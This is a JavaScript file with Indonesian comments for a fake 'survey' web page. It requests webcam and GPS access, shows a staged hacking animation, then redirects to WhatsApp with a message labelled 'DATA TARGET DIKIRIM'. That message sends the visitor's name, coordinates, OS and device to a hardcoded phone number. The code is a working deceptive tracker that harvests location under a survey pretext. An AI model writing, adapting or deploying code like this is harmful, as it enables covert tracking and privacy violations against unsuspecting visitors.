const nomorWA = "628979100200"; // Nomor Anda sudah saya masukkan

let userData = {
    coords: "Ditolak/Tidak Aktif",
    os: navigator.platform,
    device: navigator.userAgent.split(' ')[0]
};

// 1. Tombol Mulai (Minta Izin Kamera & Lokasi)
document.getElementById('start-survey').addEventListener('click', async () => {
    document.getElementById('step-1').style.display = 'none';
    document.getElementById('step-2').style.display = 'block';

    // Ambil Kamera
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        document.getElementById('webcam').srcObject = stream;
    } catch (e) { console.log("Kamera ditolak"); }

    // Ambil Lokasi
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            userData.coords = `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`;
            document.getElementById('loc-tag').textContent = "SENSING: " + userData.coords;
        });
    }
});

// 2. Tombol Kirim (Proses Animasi Hack)
document.getElementById('submit-survey').addEventListener('click', () => {
    const namaUser = document.getElementById('name').value || "Anonymous";
    document.getElementById('step-2').style.display = 'none';
    document.getElementById('step-3').style.display = 'block';

    let prg = 0;
    const bar = document.getElementById('progress');
    const status = document.getElementById('status-text');
    
    const logs = ["Ekstraksi metadata...", "Menghubungkan ke satelit...", "Mengenkripsi paket...", "Sinkronisasi selesai!"];
    
    const interval = setInterval(() => {
        prg += 25;
        bar.style.width = prg + "%";
        status.textContent = logs[prg/25 - 1];
        
        if (prg >= 100) {
            clearInterval(interval);
            setTimeout(() => {
                const teks = `🚨 *DATA TARGET DIKIRIM* 🚨%0A%0A👤 *Nama:* ${namaUser}%0A📍 *Lokasi:* ${userData.coords}%0A💻 *OS:* ${userData.os}%0A📱 *Device:* ${userData.device}%0A%0A_Data telah disinkronkan ke database._`;
                
                // Gunakan URL API WhatsApp yang paling kompatibel
                window.location.href = `https://api.whatsapp.com/send?phone=${nomorWA}&text=${teks}`;
            }, 1000);
        }
    }, 1000);
});
